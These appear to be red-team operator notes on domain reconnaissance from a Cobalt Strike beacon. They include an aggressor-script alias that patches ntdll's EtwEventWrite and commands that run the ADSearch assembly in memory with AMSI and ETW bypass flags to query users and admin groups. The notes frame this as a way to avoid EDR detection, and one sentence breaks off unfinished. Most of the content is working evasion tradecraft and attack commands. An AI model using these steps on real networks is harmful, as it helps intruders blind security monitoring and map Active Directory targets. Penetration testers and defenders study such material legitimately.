
Domain recon would generally be performed with `PowerView` by invoking the fork-and-run method in-house on Cobalt Strike. While this is generally one of the easiest routes, avoiding PowerShell usage is advised in environments with EDR due to the amount of detectable signatures.

This can be circumvented by using the `inlineExecute-Assembly` custom aggressor script, or the `execute-assembly-patched` custom aggressor script that can be loaded into Cobalt Strike. Note that these scripts will need to be loaded into the script manager prior to use.

Note that we'll need to ensure that we have

# ADSearch

```
beacon> help inlineExecute-Assembly
Synopsis: inlineExecute-Assembly --dotnetassembly /path/to/Assembly.exe --assemblyargs My Args To Pass --amsi --etw

beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --assemblyargs help --amsi --etw
```

```execute-assembly-patched.cna
# $1 - the id for the beacon
# $2 - the local path to the .NET executable assembly
# $3 - parameters to pass to the assembly
# $4 - [optional] PATCHES

alias execute-assembly-patched {
	bexecute_assembly($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C300");
}
```

```
beacon> help execute-assembly-patched

beacon> execute-assembly-patched C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe
```

Note that using ADSearch will generally be the preferred method for domain reconnaissance, as PowerShell execution is not required.

A few examples of execution are as follows:

```
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337 --assemblyargs --search "objectCategory=user"
```

```
beacon> execute-assembly-patched C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))
```